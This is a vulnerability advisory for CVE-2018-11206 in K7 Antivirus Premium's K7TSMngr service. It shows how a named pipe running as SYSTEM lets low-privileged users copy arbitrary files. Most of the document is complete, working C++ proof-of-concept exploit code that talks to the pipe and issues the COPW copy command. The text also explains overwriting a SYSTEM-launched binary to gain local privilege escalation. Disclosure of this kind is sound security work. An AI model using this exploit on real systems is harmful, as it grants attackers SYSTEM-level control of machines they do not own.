# CVE-2018-11206

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 16.0.0.0* 
* **Component**: *K7TSMngr.exe 16.0.0.70*
  * SHA256: E6655EBC79644E7DB6FC36B2D98DE88A9635F47B3ADF1D834FD357D5EA3E15A6

# K7TSMngr.exe Pipe Handler Background
*See description in [CVE-2018-8724](../CVE-2018-8724/readme.md)*

# Details
Using the named pipe \\\\.\\pipe\\K7TSMngrService1 and the function code 0x1003E, you can use the K7TSMngr service (running at SYSTEM) to copy files to/from anywhere on the system using the COPW command. This is accessible from a LOW privileged account. This allows you to bypass filing system security. The PoC will perform the copy, and to achieve a LPE you simply overwrite a binary that is run as SYSTEM. E.g. K7TSHlpe.exe which is periodically launched by the K7TSMngr service. In this handler, there is other filing system functionality which should be locked down.

The specific handler function is sub_40CC40.


# PoC Code
```C++
#include <Windows.h>
#include <stdio.h>

/////////////////////////////////////
// Common code to talk to the Pipe //
/////////////////////////////////////
typedef struct _unk1
{
	DWORD dwMagic;
	DWORD dwSomeMagic;
	DWORD dwInSize;
	DWORD field_c;
	DWORD dwFunctionId;
	DWORD dwInputDataSize;
	DWORD dwOutputDataSize;
} unk1;

// Global pipe handle
HANDLE g_hPipe = INVALID_HANDLE_VALUE;

/*
Description:
    Opens the comms pannel to the pipe

Parameters:
    N/A
    
Returns:
    TRUE on success, otherwise false.
*/
BOOL InitPipe()
{
	g_hPipe = CreateFileA("\\\\.\\pipe\\K7TSMngrService1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		printf("CreateFileW Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

/*
Description:
    Calls the pipe function for the second time with the function code after it has been initialized.

Parameters:
    dwFunctionId    Id/Code to call
    pInput          Input buffer
    dwInSize        Input buffer size, in bytes
    pOutput         Output bfufer
    dwOutSize       Output bfufer size, in bytes

Returns:
    TRUE on success, otherwise false.
*/
BOOL CallPipeFunction(DWORD dwFunctionId, PBYTE pInput, DWORD dwInSize, PBYTE pOutput, DWORD dwOutSize)
{
	if (g_hPipe == INVALID_HANDLE_VALUE)
	{
		if (!InitPipe())
		{
			return FALSE;
		}
	}

	unk1 u1 = { 0 };
	u1.dwMagic = 0x4B375453;
	u1.dwSomeMagic = 0x1010;
	u1.dwInSize = 28;
	u1.dwFunctionId = dwFunctionId;
	u1.dwInputDataSize = dwInSize;

	DWORD dwBytesWritten = 0;
	if (!WriteFile(g_hPipe, &u1, sizeof(u1), &dwBytesWritten, NULL))
	{
		printf("WriteFile 1 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	if (!WriteFile(g_hPipe, pInput, dwInSize, &dwBytesWritten, NULL))
	{
		printf("WriteFile 2 Failed: 0x%08x\r\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

/*
Description:
    Allocate memory on a page boundary.

Parameters:
    dwSize:     Size, in bytes, to allocate

Returns:
    Allcoated buffer, or NULL.
*/
PVOID AllocPrecise(DWORD dwSize)
{
	DWORD dwPageSize = ((dwSize + 4096 - 1) / 4096) * 4096;
	PBYTE pOffset = (PBYTE)VirtualAlloc(NULL, dwPageSize, MEM_COMMIT, PAGE_READWRITE);

	if (dwSize % 0x1000 == 0)
	{
		return pOffset;
	}
	pOffset += 4096 - (dwSize % 4096);
	return pOffset;
}
/////////////////////////////
// End of common pipe code //
/////////////////////////////

/*
Description:
    Gets the K7TSMngr service to call Kernel32!CopyFileW with whatever we pass through to it.

Parameters:
    pszSource   Source file to pass through to CopyFileW
    pszDest     Destination location to pass through

Returns:
    N/A
*/
VOID Vuln_LogicFlaw_CopyFile(PWSTR pszSource, PWSTR pszDest)
{
/*
Vulnerability
    Type: 
        Logical Flaw, not authenticated access to priveleged function

    Description: 
        Can copy files to anywhere as it is done by a SYSTEM level process.
        Very easy to get a LPE from here, or anything else
*/

	PVOID pData = AllocPrecise(0x8000);
	// 434f5057		COPW
	DWORD dwAction = 0x434f5057;
	memcpy(pData, &dwAction, 4);
	PWSTR pszData = (PWSTR)(((PBYTE)pData) + 4);

	wcscat(pszData, pszSource);
	pszData += wcslen(pszSource) + 1;

	wcscat(pszData, pszDest);
	pszData += wcslen(pszDest) + 1;

	PDWORD pdwData = (PDWORD)pszData;
	*pdwData = 1;

	DWORD dwSize = 4 + ((wcslen(pszSource) + wcslen(pszDest) + 2) * 2) + 4;

	CallPipeFunction(0x1003E, (PBYTE)pData, dwSize, NULL, 0);
}

int wmain(int argc, wchar_t** argv)
{
	if (argc != 3)
	{
		printf("Usage: <Source> <Dest>\r\n");
		return -1;
	}

	Vuln_LogicFlaw_CopyFile(argv[1], argv[2]);
}

```